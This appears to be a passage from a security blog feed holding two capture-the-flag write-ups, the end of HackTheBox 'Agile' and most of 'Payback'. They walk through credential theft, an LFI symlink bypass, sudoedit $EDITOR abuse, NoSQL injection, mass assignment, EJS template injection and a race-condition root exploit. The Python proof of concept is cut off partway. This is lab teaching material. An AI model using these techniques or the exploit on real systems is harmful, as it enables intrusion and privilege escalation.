<p><img src="/assets/img/Pasted image 20230324120804.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324121106.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324121122.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p>With a shell on the box as <code class="language-plaintext highlighter-rouge">www-data</code>, I can now connect to the local MySQL server whose creds I got earlier;</p>

<p><img src="/assets/img/Pasted image 20230324121353.png" alt="" /></p>

<p>The password in the <code class="language-plaintext highlighter-rouge">users</code> table are all hashed, but the ones in <code class="language-plaintext highlighter-rouge">passwords</code> table are plain;</p>

<p><img src="/assets/img/Pasted image 20230324121526.png" alt="" /></p>

<p>The creds of <code class="language-plaintext highlighter-rouge">corum</code> are of interest as that’s a valid local user. Testing them, I got access to the local user account of <code class="language-plaintext highlighter-rouge">corum</code> over SSH using the password <code class="language-plaintext highlighter-rouge">5db7caa1d13cc37c9fc2</code>;</p>

<p><img src="/assets/img/Pasted image 20230324121718.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>User has no special groups, nor sudo perms. Checking the <em>nginx</em> config files for the server at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, I understood why we couldn’t access <code class="language-plaintext highlighter-rouge">/console</code> directly;</p>

<p><img src="/assets/img/Pasted image 20230324122202.png" alt="" /></p>

<p>The config for the vhost <code class="language-plaintext highlighter-rouge">test.superpass.nginx</code> is defined in <code class="language-plaintext highlighter-rouge">superpass-test.nginx</code>. The service is listening on port <code class="language-plaintext highlighter-rouge">5555</code> locally;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="err">server</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="err">listen</span><span class="w"> </span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">80</span><span class="err">;</span><span class="w">
    </span><span class="err">server_name</span><span class="w"> </span><span class="err">test.superpass.htb;</span><span class="w">

    </span><span class="err">location</span><span class="w"> </span><span class="err">/static</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="err">alias</span><span class="w"> </span><span class="err">/app/app-testing/superpass/static;</span><span class="w">
        </span><span class="err">expires</span><span class="w"> </span><span class="mi">365</span><span class="err">d;</span><span class="w">
    </span><span class="p">}</span><span class="w">
    </span><span class="err">location</span><span class="w"> </span><span class="err">/</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="err">include</span><span class="w"> </span><span class="err">uwsgi_params;</span><span class="w">
        </span><span class="err">proxy_pass</span><span class="w"> </span><span class="err">http://</span><span class="mf">127.0</span><span class="err">.</span><span class="mf">0.1</span><span class="err">:</span><span class="mi">5555</span><span class="err">;</span><span class="w">
        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">Host</span><span class="w"> </span><span class="err">$host;</span><span class="w">
        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">X-Real-IP</span><span class="w"> </span><span class="err">$remote_addr;</span><span class="w">
        </span><span class="err">proxy_set_header</span><span class="w"> </span><span class="err">X-Forwarded-Protocol</span><span class="w"> </span><span class="err">$scheme;</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Running <code class="language-plaintext highlighter-rouge">ps aux</code> showed the process running as the user <code class="language-plaintext highlighter-rouge">runner</code>;</p>

<p><img src="/assets/img/Pasted image 20230324122624.png" alt="" /></p>

<p>So I setup an SSH tunnel using <code class="language-plaintext highlighter-rouge">-L 5555:test.superpass.htb:5555</code> and edited my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to map <code class="language-plaintext highlighter-rouge">test.superpass.htb</code> to <code class="language-plaintext highlighter-rouge">debian.local</code> (my localhost). It worked, and I can now access the server;</p>

<p><img src="/assets/img/Pasted image 20230324123000.png" alt="" /></p>

<p>This looks very similar to the public facing website. The sources are in <code class="language-plaintext highlighter-rouge">/app/app-testing</code>, and are owned by <code class="language-plaintext highlighter-rouge">runner</code>. The file <code class="language-plaintext highlighter-rouge">/app/config_test.json</code> is interesting, and is readable by <code class="language-plaintext highlighter-rouge">runner</code>, which the server is running as. Testing the LFI bug discovered earlier on the public instance, the local instance seems to be not vulnerable as it simply logs out the user;</p>

<p><img src="/assets/img/Pasted image 20230324123446.png" alt="" /></p>

<p>Checking the source at <code class="language-plaintext highlighter-rouge">/app/app-testing/superpass/views/vault_views.py</code>, I realised why;</p>

<p><img src="/assets/img/Pasted image 20230324123734.png" alt="" /></p>

<p>The application is checking to make sure the requested file’s extension ends with <code class="language-plaintext highlighter-rouge">.csv</code>. This would have complicated things, but since we already have a shell on the box, we could exploit this by creating a <em>symbolic link</em> whose name ends with <code class="language-plaintext highlighter-rouge">.csv</code> and point it to any file we wish.</p>

<p>My first attempt at doing this was to create the symlink in <code class="language-plaintext highlighter-rouge">/tmp</code> (<code class="language-plaintext highlighter-rouge">/var/tmp</code>). It didn’t work. I realized that all symlinks created in this directory by a user cannot be used by another user even if the other user has the required permissions on the destination file of the symlink. More <a href="https://superuser.com/questions/1157004/following-another-users-symlink">on this here</a></p>

<p>Since I am working as the user <code class="language-plaintext highlighter-rouge">corum</code>, I made my home directory readble and executable to <em>others</em> on the box. This is to allow <code class="language-plaintext highlighter-rouge">runner</code> to access files in <em>corum’s</em> home directory. I then created a symlink to the file <code class="language-plaintext highlighter-rouge">/app/config_test.json</code>. It worked, and I got a MySQL cred;</p>

<p><img src="/assets/img/Pasted image 20230324125600.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230324125628.png" alt="" /></p>

<p>A credential was found in the database for the user <code class="language-plaintext highlighter-rouge">edwards</code>, and the password <code class="language-plaintext highlighter-rouge">d07867c6267dcb5df0af</code> gave me access to his local account over SSH;</p>

<p><img src="/assets/img/Pasted image 20230324130116.png" alt="" /></p>

<p>The user <code class="language-plaintext highlighter-rouge">edwards</code> has permissions to use <code class="language-plaintext highlighter-rouge">sudoedit</code> to edit a file with privileges of user and group <code class="language-plaintext highlighter-rouge">dev_admin</code>. You can trigger this with the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sudoedit <span class="nt">-u</span> dev_admin /app/config_test.json
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">sudoedit</code> uses the <code class="language-plaintext highlighter-rouge">$EDITOR</code> environment variable to decide which editor to use when viewing a file. By setting it to <code class="language-plaintext highlighter-rouge">vim &lt;file&gt;</code>, we could use this to read/write to any file that has permissions for user or group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</p>

<p>Further enumeration showed that <code class="language-plaintext highlighter-rouge">/app/test_and_update.sh</code> is run as cron task by root user;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># update prod with latest from testing constantly assuming tests are passing</span>

<span class="nb">echo</span> <span class="s2">"Starting test_and_update"</span>
<span class="nb">date</span>

<span class="c"># if already running, exit</span>
ps auxww | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"grep"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"pytest"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit

echo</span> <span class="s2">"Not already running. Starting..."</span>

<span class="c"># start in dev folder</span>
<span class="nb">cd</span> /app/app-testing

<span class="c"># system-wide source doesn't seem to happen in cron jobs</span>
<span class="nb">source</span> /app/venv/bin/activate

<span class="c"># run tests, exit if failure</span>
pytest <span class="nt">-x</span> 2&gt;&amp;1 <span class="o">&gt;</span>/dev/null <span class="o">||</span> <span class="nb">exit</span>

<span class="c"># tests good, update prod (flask debug mode will load it instantly)</span>
<span class="nb">cp</span> <span class="nt">-r</span> superpass /app/app/
<span class="nb">echo</span> <span class="s2">"Complete!"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The script simply activates a python virtual environment by <em>sourcing</em> <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code>, run some tests using <code class="language-plaintext highlighter-rouge">pytest</code>, and copy all the contents of <code class="language-plaintext highlighter-rouge">/app/app-testing/superpass/</code> to <code class="language-plaintext highlighter-rouge">/app/app/</code>. Checking the permissions of the files involved, <code class="language-plaintext highlighter-rouge">/app/venv/bin/activate</code> was found to be <strong>writable</strong> to the group <code class="language-plaintext highlighter-rouge">dev_admin</code>;</p>

<p><img src="/assets/img/Pasted image 20230324131518.png" alt="" /></p>

<p>This is very interesting since the file is executed as a script. Setting my <code class="language-plaintext highlighter-rouge">$EDITOR</code> variable to <code class="language-plaintext highlighter-rouge">vim /app/venv/bin/activate</code>;</p>

<p><img src="/assets/img/Pasted image 20230324131854.png" alt="" /></p>

<p>Strangely, it opened the file in read-only mode. I had to add <code class="language-plaintext highlighter-rouge">--</code> between <code class="language-plaintext highlighter-rouge">vim</code> and the target file before it worked;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span><span class="s1">'vim -- /app/venv/bin/activate'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230324132404.png" alt="" /></p>

<p>Few seconds later, I got a shell;</p>

<p><img src="/assets/img/Pasted image 20230324132547.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>Web app has open registration.
    <ul>
      <li>It is a web-based password manager.</li>
      <li>Export feature found to be vulnerable to LFI.</li>
      <li>Exploited it to generate Werkzeug console PIN, and gained RCE.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">www-data</code>;
    <ul>
      <li>Recovered creds of user <code class="language-plaintext highlighter-rouge">corum</code> from local MySQL using creds in <code class="language-plaintext highlighter-rouge">/app/config_prod.json</code>.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">corum</code>;
    <ul>
      <li>Got <code class="language-plaintext highlighter-rouge">user.txt</code></li>
      <li>Setup an SSH tunnel to access <code class="language-plaintext highlighter-rouge">test.superpass.htb:5555</code>.</li>
      <li>Bypassed LFI filter using local symlinks to dump <code class="language-plaintext highlighter-rouge">/app/config_test.json</code>.</li>
      <li>Used it access local MySQL and found creds for <code class="language-plaintext highlighter-rouge">edwards</code>.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">edwards</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">sudoedit</code> perms to <code class="language-plaintext highlighter-rouge">/app/config_test.json</code> as user/group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</li>
      <li>Identified a cron task running <code class="language-plaintext highlighter-rouge">/app/test_and_update.sh</code> which uses a python virtual env.</li>
      <li>Virtual env setup file is writable to group <code class="language-plaintext highlighter-rouge">dev_admin</code>.</li>
      <li>Exploited it to inject a BASH reverse shell, and got a shell as <code class="language-plaintext highlighter-rouge">root</code>.</li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="medium" /><category term="werkzeug" /><category term="werkzeug console" /><category term="lfi" /><category term="mysql" /><category term="tunneling" /><category term="sudoedit" /><category term="sudo" /><category term="virtualenv" /><summary type="html"><![CDATA[Agile is a medium linux box by 0xdf featuring a simple web-based LFI that could be used to bypass PIN validation in the Werkzeug debug console. Once on the box, you’ll recover some creds from a MySQL database and gain access to a local user account. You’ll then be required to exploit a previously discovered vulnerability but this time using a local symlink to get through a filter, and then exploit sudoedit and a cron job that uses python’s virtualenv to gain code execution as root.]]></summary></entry><entry><title type="html">Payback - OdysseyCTF</title><link href="https://4g3nt47.github.io/posts/ctf/payback.html" rel="alternate" type="text/html" title="Payback - OdysseyCTF" /><published>2023-07-31T00:00:00+01:00</published><updated>2023-07-31T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/ctf/payback</id><content type="html" xml:base="https://4g3nt47.github.io/posts/ctf/payback.html"><![CDATA[<p><strong>Payback</strong> is a hard-rated box created by <a href="https://github.com/4g3nt47">me</a> for the <a href="https://ctftime.org/event/2029/">OdysseyCTF</a>. It starts with exploiting a <em>NoSQL injection</em> vulnerability in a custom application to bypass registration restrictions, and then a <em>mass assignment</em> vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to <em>LFI</em>, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to <em>SSTI</em>, and can be exploited to access another local user. Priv-esc to root is by exploiting a <em>race condition</em> in a custom binary that uses <em>libcurl</em> to download files (this part was removed in the instance used for the competition).</p>

<p><br /></p>

<h4 id="recon">Recon</h4>
<p><br /></p>

<p>Going to the web server homepage for this challenge;</p>

<p><img src="/assets/img/Pasted image 20230628021422.png" alt="" /></p>

<p>Clicking the link made a request to an unknown host;</p>

<p><img src="/assets/img/Pasted image 20230628021452.png" alt="" /></p>

<p>After adding this host to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, the page loads successfully;</p>

<p><img src="/assets/img/Pasted image 20230628021815.png" alt="" /></p>

<p>Attempt to create an account through the registration tab failed with the following error;</p>

<p><img src="/assets/img/Pasted image 20230628022023.png" alt="" /></p>

<p>Checking the developer console showed an error with a new subdomain;</p>

<p><img src="/assets/img/Pasted image 20230628022243.png" alt="" /></p>

<p>Adding the host <code class="language-plaintext highlighter-rouge">exa-api.payback.local</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file fixed the issue, and the account was created. However, I was prompted for an activation code, which I do not have;</p>

<p><img src="/assets/img/Pasted image 20230628022536.png" alt="" /></p>

<p>Trying to guess the code didn’t work;</p>

<p><img src="/assets/img/Pasted image 20230628022659.png" alt="" /></p>

<p>The route <code class="language-plaintext highlighter-rouge">/user/activate/&lt;username&gt;</code> is responsible for validating the code;</p>

<p><img src="/assets/img/Pasted image 20230628022839.png" alt="" /></p>

<p>The response headers indicate this is an <em>Express (NodeJS)</em> application running behind an <em>Nginx</em> reverse-proxy. Playing around with the request, the implementation was found to be vulnerable to <em>NoSQL Injection</em> as the application seems to accept a JSON object as the value of <code class="language-plaintext highlighter-rouge">activationCode</code>, which appears to be passed directly to the underlying query. The MongoDB query <code class="language-plaintext highlighter-rouge">{"$ne": 1}</code>, which will evaluate to <code class="language-plaintext highlighter-rouge">true</code> when been matched with anything that is not <code class="language-plaintext highlighter-rouge">1</code>, allowed me to pass the validation;</p>

<p><img src="/assets/img/Pasted image 20230628023612.png" alt="" /></p>

<p>I was then able to login to the web app as the user <code class="language-plaintext highlighter-rouge">guest</code>;</p>

<p><img src="/assets/img/Pasted image 20230628023720.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="foothold">Foothold</h4>
<p><br /></p>

<p>Playing around with the available courses didn’t yield anything interesting. <em>WEB101</em> is password-protected, and I had no luck getting in. <em>HIST101</em> is open though;</p>

<p><img src="/assets/img/Pasted image 20230628024020.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628024145.png" alt="" /></p>

<p>Along with my results for the test, the profile page also has a field for password reset;</p>

<p><img src="/assets/img/Pasted image 20230628024230.png" alt="" /></p>

<p>The feature works, and the request was made to <code class="language-plaintext highlighter-rouge">/user/profile</code>;</p>

<p><img src="/assets/img/Pasted image 20230628024421.png" alt="" /></p>

<p>Going through burp’s history, I noticed that this route also accepts a GET request that returns profile data of the user;</p>

<p><img src="/assets/img/Pasted image 20230628024552.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">admin</code> parameter is very interesting. Since the route seems to be associated with general user profile data, and is also used to update user password, could it be used to update other profile parameters beside the ones featured in the UI? So I made a request that updates the <code class="language-plaintext highlighter-rouge">admin</code> parameter and sets it to <code class="language-plaintext highlighter-rouge">true</code>, and no error was returned;</p>

<p><img src="/assets/img/Pasted image 20230628025014.png" alt="" /></p>

<p>A GET request to the route showed that the update succeeded, although the web UI was not updated in the browser;</p>

<p><img src="/assets/img/Pasted image 20230628025139.png" alt="" /></p>

<p>So I logged out and then logged back in, and a new tab named “Admin” appeared;</p>

<p><img src="/assets/img/Pasted image 20230628025258.png" alt="" /></p>

<p>The “Manage Courses” feature was interesting as I previously had no access to the “WEB101” course. However, there wasn’t any option to get or reset the course password;</p>

<p><img src="/assets/img/Pasted image 20230628025511.png" alt="" /></p>

<p>I tried to export available results, but none was available. Trying the “Export Questions” option worked, and a download for a .json file was initiated. Nothing interesting was found inside the JSON file. However, the URL used for the download stood out;</p>

<p><img src="/assets/img/Pasted image 20230628025737.png" alt="" /></p>

<p>This hints at a possible <em>Local File Inclusion (LFI)</em> vulnerability. After playing around with it, it seems the only security check the application is doing on requested files is making sure that their name starts with “exports/” prior to any path normalization. This makes it vulnerable to LFI via <em>path traversal</em>, and I was able to read local files;</p>

<p><img src="/assets/img/Pasted image 20230628030026.png" alt="" /></p>

<p>Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> showed that 2 local users exist: <code class="language-plaintext highlighter-rouge">agent47</code> and <code class="language-plaintext highlighter-rouge">exa</code>. The user <code class="language-plaintext highlighter-rouge">exa</code> is likely the user we are working with as it matches the name of the web app. Since we know SSH is running on the host, I tried to read the user’s SSH key, which should be at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code>, and it worked;</p>

<p><img src="/assets/img/Pasted image 20230628030308.png" alt="" /></p>

<p>I saved this key as <code class="language-plaintext highlighter-rouge">exa.key</code> locally, and was able to login through SSH;</p>

<p><img src="/assets/img/Pasted image 20230628030509.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="user">User</h4>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">exa</code> does not belong to any special groups, nor can we check for SUDO perms as we still don’t have their password. Exploring the home directory of the user, an interesting file <code class="language-plaintext highlighter-rouge">.dbshell</code> was found, which is what the <em>MongoDB</em> client uses as history file for the <em>MongoDB</em> CLI client;</p>

<p><img src="/assets/img/Pasted image 20230628030830.png" alt="" /></p>

<p>Going through the file reveals a possible cred;</p>

<p><img src="/assets/img/Pasted image 20230628030927.png" alt="" /></p>

<p>The password is not used by any of the local user accounts, so I kept it aside and continue to explore. 
As we noticed during recon, the web app was running behind an <em>nginx</em> reverse-proxy, and seems to be using virtual hosts.  Checking the <em>nginx</em> config files at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, a new vhost was discovered in the file named <code class="language-plaintext highlighter-rouge">payback</code>;</p>

<p><img src="/assets/img/Pasted image 20230628031333.png" alt="" /></p>

<p>Notice that the vhost was configured to be accessible only to clients in the local network, with the actual server listening locally on port <code class="language-plaintext highlighter-rouge">3000</code>. With our SSH access as user <code class="language-plaintext highlighter-rouge">exa</code>, we can easily setup a tunnel to access this site;</p>

<p><img src="/assets/img/Pasted image 20230628031519.png" alt="" /></p>

<p>The site is now accessible locally on my box through port <code class="language-plaintext highlighter-rouge">3000</code>;</p>

<p><img src="/assets/img/Pasted image 20230628031809.png" alt="" /></p>

<p>It seems to be a site for sharing quotes. Attempt to create an account failed;</p>

<p><img src="/assets/img/Pasted image 20230628031900.png" alt="" /></p>

<p>Remembering the previous credential we discovered in the home of <code class="language-plaintext highlighter-rouge">exa</code> in <code class="language-plaintext highlighter-rouge">.dbshell</code>, I tried it in the login page, and was able to login using <code class="language-plaintext highlighter-rouge">admin:c036c836be2aaea2cb7222fb72eeea3a</code>;</p>

<p><img src="/assets/img/Pasted image 20230628032106.png" alt="" /></p>

<p>We now have the option to add a quote. However, clicking “submit” says the feature is disabled;</p>

<p><img src="/assets/img/Pasted image 20230628032148.png" alt="" /></p>

<p>The “preview” feature is still working though;</p>

<p><img src="/assets/img/Pasted image 20230628032303.png" alt="" /></p>

<p>I started playing with the requests to see if this could be exploited. Like the <em>Exa</em> web app, this app is also powered by <em>Express (NodeJS)</em>. However, this app doesn’t seems to be using a frontend library as the quote entered is submitted to the backend through a POST request to <code class="language-plaintext highlighter-rouge">/api/quote/preview</code>, and a GET request is then made to the same route, which returns a pre-rendered page containing the new quote. So I started testing for <em>Server Side Template Injections (SSTI)</em> in the quote preview feature, as it’s the only place I could inject input, and it payed off! The site is using <em>EJS</em> template engine;</p>

<p><img src="/assets/img/Pasted image 20230628033259.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628033331.png" alt="" /></p>

<p>I tried a few RCE payloads, but none worked due to lack of access to the <code class="language-plaintext highlighter-rouge">require</code> command, so I moved on. The file <code class="language-plaintext highlighter-rouge">.env</code> is popular with NodeJS applications, and it’s commonly used to store secrets like database credentials and API keys. This file is typically imported using the <code class="language-plaintext highlighter-rouge">dotenv</code> module, which parses and store it into the <code class="language-plaintext highlighter-rouge">process.env</code> object. Using the <em>SSTI</em>, I was able to read this object and obtain the backend database credential;</p>

<p><img src="/assets/img/Pasted image 20230628033655.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628033729.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628033822.png" alt="" /></p>

<p>I was able to access the backend DB using the URL <code class="language-plaintext highlighter-rouge">mongodb://qruser:2abe35c9146772663efba402620062a2@localhost/qrdb</code>;</p>

<p><img src="/assets/img/Pasted image 20230628033921.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">users</code> collection looks interesting, so I dumped it. Inside I found username and password hash of 2 users: <code class="language-plaintext highlighter-rouge">admin</code> (which we already have), and <code class="language-plaintext highlighter-rouge">agent47</code> (which is the username of a local user account on the box);</p>

<p><img src="/assets/img/Pasted image 20230628212422.png" alt="" /></p>

<p>The password hash looks to be MD5, so I copied it to a file and tried to crack it using <em>John the Ripper</em>. It worked! The creds are <code class="language-plaintext highlighter-rouge">agent47:angle0164363985</code>;</p>

<p><img src="/assets/img/Pasted image 20230628212734.png" alt="" /></p>

<p>Testing this cred against the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>, I was able to login;</p>

<p><img src="/assets/img/Pasted image 20230628212948.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="privesc">PrivEsc</h4>
<p><br /></p>

<p>Apart from the source files of the <em>QuotesRank</em> web app, nothing of much interest was found in the home dir of <code class="language-plaintext highlighter-rouge">agent47</code>. Checking for SUDO showed that the user has sudo rights on what seems to be a custom binary;</p>

<p><img src="/assets/img/Pasted image 20230628213401.png" alt="" /></p>

<p>So I copied this over to my box for analysis. The binary seems to be a simple utility for downloading files from a given URL. The program uses the CURL library (<code class="language-plaintext highlighter-rouge">libcurl</code>) for making web requests;</p>

<p><img src="/assets/img/Pasted image 20230628213833.png" alt="" /></p>

<p>The IDA decompiler (shortcut: <code class="language-plaintext highlighter-rouge">F5</code>) did a very good job of reversing the binary. Going through the code, the program accepts 2 arguments as shown in the usage message: the first one being the URL, and the second one being the output file to write to. It then proceed to take the basename of the output file given using the <code class="language-plaintext highlighter-rouge">basename()</code> function provided in <code class="language-plaintext highlighter-rouge">libgen.h</code> (likely to prevent path traversal) and append it to the string <code class="language-plaintext highlighter-rouge">/opt/downloads/</code>. It then checks if the new path generated exists by trying to open it for read. If it succeed, it indicates the file exists, and the program exits with code <code class="language-plaintext highlighter-rouge">2</code>;</p>

<p><img src="/assets/img/Pasted image 20230628214755.png" alt="" /></p>

<p>This indicates the program does not want us to overwrite existing files during download. It then proceeds to create a custom buffer and calls <code class="language-plaintext highlighter-rouge">http_get()</code> with the URL and buffer as arguments. The <code class="language-plaintext highlighter-rouge">http_get()</code> function is what handles the actual file download. It uses CURL and writes the complete body of the HTTP response to the given buffer (with the aid of the function <code class="language-plaintext highlighter-rouge">body_receiver()</code>);</p>

<p><img src="/assets/img/Pasted image 20230628215411.png" alt="" /></p>

<p>Once the <code class="language-plaintext highlighter-rouge">http_get()</code> function finished the download, it returns, and the <code class="language-plaintext highlighter-rouge">main()</code> function writes the contents of the buffer to the output file;</p>

<p><img src="/assets/img/Pasted image 20230628215540.png" alt="" /></p>

<p>Notice that the file is opened for writing only after the HTTP request has been completed, which takes time. Since the program does not perform another check to make sure the requested output file does not exist this time, this creates a <em>race condition</em> vulnerability.</p>

<p>An interesting way to exploit this vulnerability is using <em>symbolic links</em>, which are special files that point other files, acting like some sort of proxy. If we can get the program to write to a symlink that points to a critical file on the system, we may be able to write arbitrary data to any file on the system since we are running <code class="language-plaintext highlighter-rouge">dloader</code> as root. The major obstacle to this is that all downloads are saved to <code class="language-plaintext highlighter-rouge">/opt/downlaods/</code>. However, this directory is owned by <em>root</em> and belongs to the group <em>devs</em>, which is interesting because the user <code class="language-plaintext highlighter-rouge">agent47</code> also belongs to that group;</p>

<p><img src="/assets/img/Pasted image 20230628220644.png" alt="" /></p>

<p>Thanks to the group permission, we can now write to the <code class="language-plaintext highlighter-rouge">/opt/downloads</code> directory. After a couple of tests, I was able to develop a PoC that exploits the <em>race condition</em> to overwrite the SSH key of the root user;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
#--------------------------------------------------------------------------------
#   An exploit for the race condition affecting `dloader` for the privesc part of
# Payback (Web) - OdysseyCTF (agent47 =&gt; root)
#   It exploits the race condition to add the public part of an SSH key to the 
# 'authorized_keys' file of the root user. 
# Killchain;
# 1. Creates a public and private SSH key pair.
# 2. Creates a simple socket server to serve the public key for download.
# 3. Once a request is received for the public key, it indicates the file check
# has already been performed, so the program exploits the race condition by crea-
# ing a dangling symbolic link to '/root/.ssh/authorized_keys'
# 4. The exploit then sends the public key contents, which the dloader executable
# writes to the symbolic link.
# 5. The program then uses the private key created earlier to authenticate.  
#                                                                 Author: 4g3nt47
#--------------------------------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">random</span>

<span class="c1"># For generating random alpha-numeric strings.
</span><span class="k">def</span> <span class="nf">randstr</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
  <span class="n">rstr</span> <span class="o">=</span> <span class="s">""</span>
  <span class="n">chars</span> <span class="o">=</span> <span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span>
  <span class="k">while</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
    <span class="n">size</span> <span class="o">-=</span> <span class="mi">1</span>
    <span class="n">rstr</span> <span class="o">+=</span> <span class="n">chars</span><span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)]</span>
  <span class="k">return</span> <span class="n">rstr</span>

<span class="c1"># Where the magic happens...
</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
  <span class="n">password</span> <span class="o">=</span> <span class="s">"angle0164363985"</span> <span class="c1"># agent47's password required for using 'sudo'
</span>  <span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">"/dev/shm"</span><span class="p">)</span>         <span class="c1"># A writable dir for writing temporary files.
</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating SSH keys..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh-keygen -N '' -f exploit.key"</span><span class="p">)</span> <span class="c1"># Creates exploit.key and exlpoit.key.pub
</span>  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Starting server..."</span><span class="p">)</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
  <span class="n">s</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
  <span class="n">port</span> <span class="o">=</span> <span class="mi">4747</span>
  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Server started!"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Executing 'sudo /usr/bin/dloader'..."</span><span class="p">)</span>
